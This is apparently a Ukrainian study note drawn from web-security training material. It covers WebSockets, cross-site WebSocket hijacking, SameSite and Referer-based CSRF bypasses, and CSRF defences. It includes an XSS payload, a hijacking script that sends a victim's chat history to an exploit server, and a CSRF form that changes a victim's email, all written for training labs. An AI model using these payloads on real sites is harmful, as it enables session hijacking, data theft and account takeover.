**WebSockets** широко використовуються в сучасних вебзастосунках. Вони ініціюються поверх HTTP і забезпечують **довготривалі з’єднання з асинхронним обміном даними в обох напрямках**.

WebSockets застосовуються для найрізноманітніших завдань, зокрема **виконання дій від імені користувача та передавання конфіденційної інформації**. Практично **будь-яка веб-уразливість, яка виникає у звичайному HTTP, може також виникати й у WebSockets-комунікаціях**.

## What are WebSockets?

**WebSockets** — це двонапрямний, повнодуплексний протокол обміну даними, який ініціюється поверх HTTP. Вони зазвичай використовуються в сучасних вебзастосунках для **потокової передачі даних** та іншого **асинхронного трафіку**.
## What is the difference between HTTP and WebSockets?

Більшість обміну даними між веббраузерами та вебсайтами відбувається за допомогою **HTTP**. У HTTP клієнт надсилає запит, а сервер повертає відповідь. Зазвичай відповідь надходить одразу, після чого обмін завершується. Навіть якщо мережеве з’єднання залишається відкритим, воно використовується лише для окремих транзакцій типу «запит-відповідь».

Деякі сучасні вебсайти використовують **WebSockets**. WebSocket-з’єднання ініціюються поверх HTTP і зазвичай є **довготривалими**. Повідомлення можуть надсилатися **в обох напрямках у будь-який момент** і не мають транзакційної природи. З’єднання зазвичай залишається відкритим і неактивним доти, доки клієнт або сервер не буде готовий надіслати повідомлення.

WebSockets особливо корисні в ситуаціях, де потрібна **низька затримка** або **ініційовані сервером повідомлення**, наприклад, для **передавання фінансових даних у реальному часі**.
## How are WebSocket connections established?

**WebSocket-з’єднання** зазвичай створюються за допомогою клієнтського JavaScript, наприклад:
```
var ws = new WebSocket("wss://normal-website.com/chat");
```
Протокол **wss** встановлює WebSocket поверх **зашифрованого TLS-з’єднання**, тоді як протокол **ws** використовує **незашифроване з’єднання**.
Щоб встановити з’єднання, браузер і сервер виконують **WebSocket-рукостискання (handshake)** поверх HTTP. Браузер надсилає HTTP-запит на рукостискання WebSocket приблизно такого вигляду:
```
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
Якщо сервер приймає з’єднання, він повертає відповідь на рукостискання WebSocket такого вигляду:
```
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
Після цього мережеве з’єднання **залишається відкритим** і може використовуватися для надсилання **WebSocket-повідомлень у будь-якому напрямку**.

Декілька важливих особливостей повідомлень WebSocket-рукостискання:

- Заголовки **Connection** та **Upgrade** у запиті й відповіді вказують, що це саме WebSocket-рукостискання.
    
- Заголовок запиту **Sec-WebSocket-Version** визначає версію протоколу WebSocket, яку хоче використовувати клієнт. Зазвичай це версія **13**.
    
- Заголовок запиту **Sec-WebSocket-Key** містить випадкове значення, закодоване у Base64, яке має генеруватися наново для кожного рукостискання.
    
- Заголовок відповіді **Sec-WebSocket-Accept** містить хеш значення з **Sec-WebSocket-Key**, об’єднаного з рядком, визначеним у специфікації протоколу. Це зроблено для запобігання хибним відповідям через неправильно налаштовані сервери або кешуючі проксі.
## What do WebSocket messages look like?

Після встановлення **WebSocket-з’єднання** повідомлення можуть **асинхронно надсилатися в будь-якому напрямку** — як клієнтом, так і сервером.

Просте повідомлення може бути надіслане з браузера за допомогою клієнтського JavaScript, наприклад:

`ws.send("Peter Wiener");`

У принципі, **WebSocket-повідомлення можуть містити будь-який вміст або формат даних**. У сучасних застосунках для передавання структурованих даних у WebSocket-повідомленнях часто використовується **JSON**.

Наприклад, чат-бот-застосунок, що використовує WebSockets, може надсилати повідомлення такого вигляду:

`{"user":"Hal Pline","content":"Я в дитинстві хотів бути PlayStation, а не пристроєм для відповіді на твої безглузді запитання"}`
## Manipulating WebSocket traffic

Пошук **уразливостей безпеки WebSocket** зазвичай полягає в **маніпулюванні повідомленнями способами, яких застосунок не очікує**. Для цього можна використовувати **Burp Suite**.

За допомогою Burp Suite можна:

- **Перехоплювати та змінювати WebSocket-повідомлення**.
    
- **Відтворювати (replay) та генерувати нові WebSocket-повідомлення**.
    
- **Маніпулювати WebSocket-з’єднаннями**.

### Intercepting and modifying WebSocket messages

Ви можете використовувати **Burp Proxy** для **перехоплення та модифікації WebSocket-повідомлень** наступним чином:

1. Відкрийте **браузер Burp**.
    
2. Перейдіть до функціональності застосунку, яка використовує **WebSockets**. Ви можете визначити, що WebSockets використовуються, працюючи із застосунком і перевіряючи появу записів у вкладці **WebSockets history** в **Burp Proxy**.
    
3. У вкладці **Intercept** в Burp Proxy переконайтеся, що **перехоплення увімкнене**.
    
4. Коли WebSocket-повідомлення надсилається з браузера або сервера, воно з’явиться у вкладці **Intercept**, де ви можете **переглянути або змінити його**. Натисніть кнопку **Forward**, щоб переслати повідомлення далі.
### Replaying and generating new WebSocket messages

Окрім **перехоплення та зміни WebSocket-повідомлень у реальному часі**, ви також можете **відтворювати окремі повідомлення та генерувати нові**. Для цього використовується **Burp Repeater**:

1. У **Burp Proxy** виберіть повідомлення у вкладці **WebSockets history** або у вкладці **Intercept**, після чого в контекстному меню оберіть **“Send to Repeater”**.
    
2. У **Burp Repeater** ви можете **редагувати вибране повідомлення** та **надсилати його знову і знову**.
    
3. Ви можете **створити нове повідомлення** і надіслати його **в будь-якому напрямку** — клієнту або серверу.
    
4. У панелі **History** в Burp Repeater ви можете переглядати **історію повідомлень**, які були передані через WebSocket-з’єднання. Це включає повідомлення, створені вами в Burp Repeater, а також ті, що були згенеровані браузером або сервером через те саме з’єднання.
    
5. Якщо ви хочете **відредагувати та повторно надіслати будь-яке повідомлення з історії**, виберіть його і в контекстному меню натисніть **“Edit and resend”**.
### Manipulating WebSocket connections

Окрім маніпулювання **WebSocket-повідомленнями**, іноді необхідно **маніпулювати самим WebSocket-рукостисканням (handshake)**, яке встановлює з’єднання.

Існує кілька ситуацій, у яких редагування WebSocket-handshake може бути необхідним:

- Це може **відкрити доступ до більшої поверхні атаки**.
    
- Деякі атаки можуть призвести до **розриву з’єднання**, тому потрібно встановити нове.
    
- **Токени або інші дані** в початковому запиті рукостискання можуть **застаріти** й потребувати оновлення.
    

Ви можете маніпулювати WebSocket-handshake за допомогою **Burp Repeater**:

1. Надішліть WebSocket-повідомлення в **Burp Repeater**, як описано раніше.
    
2. У **Burp Repeater** натисніть на **іконку олівця** поруч із URL WebSocket. Це відкриє майстер, який дозволяє:
    
    - під’єднатися до вже активного WebSocket,
        
    - клонувати активне WebSocket-з’єднання,
        
    - або повторно під’єднатися до розірваного WebSocket.
        
3. Якщо ви оберете **клонування активного з’єднання** або **перепідключення до розірваного**, майстер покаже **повні деталі запиту WebSocket-handshake**, які можна **відредагувати перед виконанням рукостискання**.
    
4. Після натискання **“Connect”** Burp спробує виконати налаштоване рукостискання та покаже результат. Якщо нове WebSocket-з’єднання було успішно встановлене, ви зможете використовувати його для **надсилання нових повідомлень у Burp Repeater**.
## WebSockets security vulnerabilities

В принципі, **майже будь-яка веб-вразливість безпеки може виникнути у зв’язку з WebSocket**:

- **Дані, надані користувачем**, які передаються на сервер через WebSocket, можуть оброблятися небезпечним чином, що призводить до таких вразливостей, як **SQL-інʼєкція** або **XXE (XML External Entity)-інʼєкція**.
    
- Деякі **сліпі (blind) вразливості**, до яких можна дістатися через WebSocket, можуть бути виявлені лише з використанням **out-of-band (OAST) технік**.
    
- Якщо **дані, контрольовані атакувальником**, передаються через WebSocket іншим користувачам застосунку, це може призвести до **XSS** або інших **клієнтських вразливостей**.
### Manipulating WebSocket messages to exploit vulnerabilities

Більшість **вразливостей, пов’язаних із введенням даних у WebSockets**, можна знайти та експлуатувати шляхом **модифікації вмісту WebSocket‑повідомлень**.

Наприклад, уявімо, що чат‑застосунок використовує WebSockets для передавання повідомлень між браузером і сервером. Коли користувач вводить повідомлення, на сервер надсилається WebSocket‑повідомлення такого вигляду:

`{"message":"Hello Carlos"}`

Вміст цього повідомлення (знову ж таки через WebSockets) передається іншому користувачу чату та відображається в його браузері наступним чином:

`<td>Hello Carlos</td>`

У цій ситуації, за умови відсутності будь‑якої додаткової обробки введення або механізмів захисту, атакувальник може виконати **XSS‑атаку (proof‑of‑concept)**, надіславши таке WebSocket‑повідомлення:

`{"message":"<img src=1 onerror='alert(1)'>"}`
### Manipulating the WebSocket handshake to exploit vulnerabilities

Деякі **вразливості WebSockets** можна виявити та експлуатувати **лише шляхом маніпуляції WebSocket‑рукостисканням (handshake)**. Такі вразливості зазвичай пов’язані з **помилками проєктування**, зокрема:

- **Неправильна довіра до HTTP‑заголовків** під час ухвалення рішень щодо безпеки, наприклад до заголовка `X-Forwarded-For`.
    
- **Помилки в механізмах керування сесіями**, оскільки контекст сесії, у якому обробляються WebSocket‑повідомлення, зазвичай визначається контекстом сесії під час виконання handshake.
    
- **Додаткова поверхня атаки**, що виникає через використання застосунком кастомних HTTP‑заголовків.
### Using cross-site WebSockets to exploit vulnerabilities

Деякі **вразливості безпеки WebSockets** виникають, коли зловмисник створює **міждоменне WebSocket‑з’єднання** з вебсайту, який він контролює. Це відомо як **міжсайтове викрадення WebSocket (cross‑site WebSocket hijacking)** і ґрунтується на **вразливості CSRF** під час виконання WebSocket‑рукостискання (handshake).

Така атака часто має **серйозні наслідки**, оскільки дозволяє зловмиснику **виконувати привілейовані дії від імені жертви** або **перехоплювати конфіденційні дані**, до яких жертва має доступ.

# Cross-site WebSocket hijacking (CSWSH)

## What is cross-site WebSocket hijacking?

**Міжсайтове викрадення WebSocket** (також відоме як **cross‑origin WebSocket hijacking**) пов’язане з **вразливістю CSRF** під час WebSocket‑рукостискання. Воно виникає тоді, коли запит на встановлення WebSocket‑з’єднання покладається **лише на HTTP‑cookies** для керування сесією і **не містить CSRF‑токенів або інших непередбачуваних значень**.

Зловмисник може створити **шкідливу вебсторінку на власному домені**, яка встановлює міжсайтове WebSocket‑з’єднання з уразливим застосунком. Застосунок оброблятиме це з’єднання **в контексті сесії жертви**, яка вже автентифікована в цьому застосунку.

Після цього сторінка зловмисника може **надсилати довільні повідомлення на сервер через це з’єднання** та **читати відповіді сервера**. Це означає, що на відміну від класичного CSRF, зловмисник отримує **двосторонню взаємодію** зі скомпрометованим застосунком.
## What is the impact of cross-site WebSocket hijacking?

Успішна атака **міжсайтового викрадення WebSocket** часто дозволяє зловмиснику:

- **Виконувати несанкціоновані дії від імені жертви.** Як і у випадку зі звичайним CSRF, зловмисник може надсилати довільні повідомлення серверному застосунку. Якщо застосунок використовує WebSocket‑повідомлення, створені клієнтом, для виконання будь‑яких чутливих дій, то зловмисник може згенерувати відповідні повідомлення з іншого домену та ініціювати ці дії.
    
- **Отримувати доступ до конфіденційних даних, доступних користувачеві.** На відміну від звичайного CSRF, міжсайтове викрадення WebSocket надає зловмиснику **двосторонню взаємодію** з уразливим застосунком через скомпрометоване WebSocket‑з’єднання. Якщо застосунок використовує серверні WebSocket‑повідомлення для повернення користувачеві будь‑яких чутливих даних, зловмисник може перехопити ці повідомлення та викрасти дані жертви.
## Performing a cross-site WebSocket hijacking attack

Оскільки атака **міжсайтового викрадення WebSocket** по суті є вразливістю CSRF на етапі WebSocket‑рукостискання, першим кроком під час виконання атаки є аналіз рукостискань WebSocket, які використовує застосунок, і визначення того, чи захищені вони від CSRF.

З погляду стандартних умов для CSRF‑атак, зазвичай потрібно знайти повідомлення рукостискання, яке покладається **виключно на HTTP‑cookies** для керування сесією і **не використовує жодних токенів або інших непередбачуваних значень** у параметрах запиту.

Наприклад, наведений нижче запит WebSocket‑рукостискання, ймовірно, є вразливим до CSRF, оскільки єдиний сесійний токен передається через cookie:
```
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
Заголовок `Sec-WebSocket-Key` містить випадкове значення для запобігання помилкам, пов’язаним із кешувальними проксі, і **не використовується** для автентифікації або керування сесією.

Якщо запит WebSocket‑рукостискання є вразливим до CSRF, тоді шкідлива веб‑сторінка зловмисника може виконати міжсайтовий запит і відкрити WebSocket‑з’єднання з уразливим сайтом. Подальший розвиток атаки повністю залежить від логіки застосунку та того, як саме він використовує WebSockets. Атака може включати:

- надсилання WebSocket‑повідомлень для виконання несанкціонованих дій від імені жертви;
    
- надсилання WebSocket‑повідомлень для отримання конфіденційних даних;
    
- у деяких випадках - просто очікування вхідних повідомлень, що містять чутливу інформацію.

Приклад ескплоїта:

```
<script>

var ws = new WebSocket("wss://0afe00ff04dfbd3880ac032200a500ff.web-security-academy.net/chat");

ws.onopen = function() {
    ws.send("READY");
};

ws.onmessage = function(event) {
    fetch("https://exploit-0afe00e20412bdff80e0020d01c90085.exploit-server.net/exploit?message=" + btoa(event.data));
};

</script>
```

цей експлоїт копіює всю історію чата та відправляє нам у бейс64 форматі.
## How to secure a WebSocket connection

Щоб мінімізувати ризик виникнення вразливостей безпеки, пов’язаних із WebSockets, дотримуйтесь таких рекомендацій:

- Використовуйте протокол **wss://** (WebSockets поверх TLS).
    
- Жорстко задавайте URL WebSocket‑ендпоінта і **ні в якому разі не включайте** в нього дані, які може контролювати користувач.
    
- Захищайте повідомлення WebSocket‑рукостискання від **CSRF**, щоб уникнути вразливостей типу міжсайтового викрадення WebSocket.
    
- Розглядайте дані, отримані через WebSocket, як **недовірені в обох напрямках**. Безпечно обробляйте дані як на стороні сервера, так і на стороні клієнта, щоб запобігти вразливостям, заснованим на введенні даних, таким як SQL‑інʼєкції та міжсайтовий скриптинг (XSS).
## Bypassing SameSite Lax restrictions with newly issued cookies

Cookie з обмеженнями **SameSite=Lax** зазвичай не надсилаються в міжсайтових POST‑запитах, однак існують деякі винятки.

Як згадувалося раніше, якщо вебсайт не вказує атрибут SameSite під час встановлення cookie, Chrome автоматично застосовує обмеження **Lax** за замовчуванням. Проте, щоб уникнути порушення роботи механізмів **єдиного входу (SSO)**, Chrome фактично **не застосовує ці обмеження протягом перших 120 секунд** для top‑level POST‑запитів. У результаті існує **двоххвилинне вікно**, протягом якого користувачі можуть бути вразливими до міжсайтових атак.

Це двоххвилинне вікно **не застосовується** до cookie, які були явно встановлені з атрибутом `SameSite=Lax`.

Намагатися точно підгадати атаку під це коротке вікно досить непрактично. З іншого боку, якщо вам вдасться знайти gadget на сайті, який дозволяє **примусово видати жертві новий сесійний cookie**, ви можете заздалегідь оновити її cookie перед виконанням основної атаки. Наприклад, завершення процесу входу на основі OAuth може щоразу призводити до створення нової сесії, оскільки OAuth‑сервіс не обов’язково знає, чи користувач усе ще авторизований на цільовому сайті.

Щоб ініціювати оновлення cookie без необхідності повторного ручного входу користувача, потрібно використати **top‑level навігацію**, яка гарантує, що cookie, пов’язані з поточною OAuth‑сесією користувача, будуть включені. Це створює додаткову складність, оскільки після цього потрібно **перенаправити користувача назад на свій сайт**, щоб запустити CSRF‑атаку.

Альтернативно, ви можете ініціювати оновлення cookie в **новій вкладці**, щоб браузер не покидав поточну сторінку до того, як ви зможете виконати фінальну атаку. Невелика проблема цього підходу полягає в тому, що браузери блокують спливаючі вкладки, якщо вони не відкриваються внаслідок ручної дії користувача. Наприклад, такий виклик буде заблокований браузером за замовчуванням:

`window.open('https://vulnerable-website.com/login/sso');`

Щоб обійти це обмеження, можна обгорнути цей виклик в обробник події `onclick`:
```
window.onclick = () => {
    window.open('https://vulnerable-website.com/login/sso');
}
```
Таким чином метод `window.open()` викликається лише тоді, коли користувач клацає в будь‑якому місці сторінки. Приклад експлоїта:
```
<form
    method="POST"
    action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"
>
    <input
        type="hidden"
        name="email"
        value="pwned@portswigger.net"
    >
</form>

<p>Click anywhere on the page</p>

<script>
    window.onclick = () => {
        // Open OAuth / social login in a new tab to refresh the session cookie
        window.open(
            'https://YOUR-LAB-ID.web-security-academy.net/social-login'
        );

        // Wait for the cookie refresh, then trigger CSRF
        setTimeout(changeEmail, 5000);
    };

    function changeEmail() {
        document.forms[0].submit();
    }
</script>

```
# Bypassing Referer-based CSRF defenses

Окрім механізмів захисту, що використовують CSRF‑токени, деякі застосунки намагаються захищатися від CSRF‑атак за допомогою HTTP‑заголовка **Referer**, зазвичай перевіряючи, що запит походить із власного домену застосунку. Такий підхід загалом є менш ефективним і часто може бути обійдений.
#### Referer header

HTTP‑заголовок **Referer** (який через помилку має неправильне написання в специфікації HTTP) є необов’язковим заголовком запиту, що містить URL вебсторінки, з якої було здійснено перехід до ресурсу, що запитується. Зазвичай браузери автоматично додають його, коли користувач ініціює HTTP‑запит, зокрема під час кліку на посилання або надсилання форми. Існують різні способи, які дозволяють сторінці‑джерелу приховати або змінити значення заголовка **Referer**. Часто це робиться з міркувань приватності.
## Validation of Referer depends on header being present

Деякі застосунки перевіряють заголовок **Referer** лише тоді, коли він присутній у запиті, але **пропускають перевірку**, якщо цей заголовок відсутній.

У такій ситуації атакувальник може створити CSRF‑експлойт так, щоб браузер жертви **взагалі не надсилав заголовок Referer** у фінальному запиті. Існує кілька способів цього досягти, але найпростіший — використати META‑тег на HTML‑сторінці, яка хостить CSRF‑атаку:

`<meta name="referrer" content="never">`

Простими словами: якщо сайт «довіряє» запитам без Referer, то атакувальник може навмисно прибрати цей заголовок - і захист зламається. Це одна з причин, чому **Referer‑based захист вважається слабким**.
## Validation of Referer can be circumvented(обійдено)

Деякі застосунки перевіряють заголовок **Referer** наївним способом, який можна обійти. Наприклад, якщо застосунок лише перевіряє, що домен у Referer **починається** з очікуваного значення, атакувальник може використати це значення як **піддомен свого домену**:

`http://vulnerable-website.com.attacker-website.com/csrf-attack`

Аналогічно, якщо застосунок просто перевіряє, що Referer **містить** назву його домену, атакувальник може вставити потрібне значення в будь‑яку частину URL, наприклад у query‑параметр:

`http://attacker-website.com/csrf-attack?vulnerable-website.com`
Якщо це спрацювало то можна додати це в наш атакуючий вебсайт:
```
history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net")
```
Хоча таку поведінку часто можна виявити за допомогою Burp, на практиці експлойт може **не працювати в реальному браузері**. Це пов’язано з тим, що багато сучасних браузерів за замовчуванням **видаляють рядок запиту (query string)** з заголовка Referer, щоб зменшити ризик витоку чутливих даних.

Цю поведінку можна змінити, якщо сервер, який віддає сторінку з експлойтом, встановить заголовок:

`Referrer-Policy: unsafe-url`

У такому разі браузер надсилатиме **повний URL у Referer**, включно з query‑рядком. 
# How to prevent CSRF vulnerabilities
## Use CSRF tokens

Найнадійніший спосіб захисту від CSRF-атак — **використовувати CSRF-токени** в усіх релевантних запитах. Такий токен повинен відповідати таким вимогам:

- **Бути непередбачуваним і мати високу ентропію** (як і звичайні session-токени).
    
- **Бути прив’язаним до сесії конкретного користувача**.
    
- **Строго перевірятися у кожному випадку** перед виконанням чутливої дії.
### How should CSRF tokens be generated?

CSRF-токени повинні містити значну ентропію та бути сильно непередбачуваними, з тими ж властивостями, що й session-токени загалом.

Слід використовувати криптографічно стійкий генератор псевдовипадкових чисел (CSPRNG), ініціалізований часовою міткою створення разом зі статичним секретом.

Якщо потрібна додаткова впевненість понад міцність CSPRNG, можна генерувати окремі токени, поєднуючи його результат з певною користувацькою ентропією, і застосовувати сильний хеш до всієї структури. Це створює додаткову перешкоду для атакувальника, який намагається аналізувати токени на основі зразків, виданих йому.
### How should CSRF tokens be transmitted?

CSRF-токени слід розглядати як секрети та безпечно обробляти протягом усього їх життєвого циклу. Зазвичай ефективним підходом є передача токена клієнту у прихованому полі HTML-форми, яка надсилається методом POST. Після цього токен включається як параметр запиту під час відправлення форми:

`<input type="hidden" name="csrf-token" value="CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz" />`

Для додаткової безпеки поле з CSRF-токеном слід розміщувати якомога раніше в HTML-документі, в ідеалі — перед будь-якими не прихованими полями введення та перед будь-якими місцями, де в HTML вбудовуються дані, контрольовані користувачем. Це зменшує ризик різних технік, за допомогою яких атакувальник може маніпулювати HTML-документом і перехоплювати частини його вмісту.

Альтернативний підхід — розміщення токена в рядку запиту URL — є менш безпечним, оскільки рядок запиту:

- логуються в різних місцях на стороні клієнта і сервера;
    
- може передаватися третім сторонам у заголовку HTTP Referer;
    
- може відображатися на екрані в браузері користувача.
    
Деякі застосунки передають CSRF-токени у власному HTTP-заголовку. Це створює додатковий захист від атакувальника, який зміг передбачити або перехопити токен іншого користувача, оскільки браузери зазвичай не дозволяють відправляти власні заголовки між доменами. Однак такий підхід обмежує застосунок використанням XHR-запитів (замість HTML-форм) і може вважатися надмірно складним у багатьох ситуаціях.

CSRF-токени **не повинні передаватися у cookies**.
### How should CSRF tokens be validated?

Під час генерації CSRF-токен слід зберігати на сервері в даних сесії користувача. Коли надходить наступний запит, який потребує перевірки, серверний застосунок повинен перевірити, що запит містить токен, який відповідає значенню, збереженому в сесії користувача. Цю перевірку необхідно виконувати незалежно від HTTP-методу або типу контенту запиту. Якщо запит взагалі не містить токена, його слід відхилити так само, як і у випадку наявності некоректного токена.
## Use Strict SameSite cookie restrictions

Окрім впровадження надійної перевірки CSRF-токенів, ми рекомендуємо **явно задавати власні обмеження SameSite** для кожного cookie, який ви встановлюєте. Таким чином ви зможете точно контролювати, **у яких контекстах cookie буде використовуватися**, незалежно від браузера.

Навіть якщо всі браузери з часом перейдуть на політику **«Lax за замовчуванням»**, вона підходить не для всіх cookies і **набагато легше обходиться**, ніж обмеження **Strict**. До того ж, через різну поведінку браузерів наразі лише частина користувачів взагалі отримує захист SameSite.

В ідеалі слід **використовувати політику Strict за замовчуванням**, а знижувати її до **Lax** лише за наявності вагомої причини. **Ніколи не вимикайте SameSite-обмеження, встановлюючи SameSite=None**, якщо ви повністю не усвідомлюєте наслідки для безпеки.
## Be wary of cross-origin, same-site attacks

Хоча правильно налаштовані SameSite-обмеження добре захищають від міжсайтових атак, важливо розуміти, що вони **повністю безсилі проти cross-origin, same-site атак**.

За можливості рекомендується **ізолювати небезпечний контент**, наприклад файли, завантажені користувачами, **на окремому сайті**, відокремленому від будь-якої чутливої функціональності або даних. Під час тестування сайту обов’язково ретельно перевіряйте **всю доступну поверхню атаки в межах одного сайту**, включно з усіма його суміжними (sibling) доменами.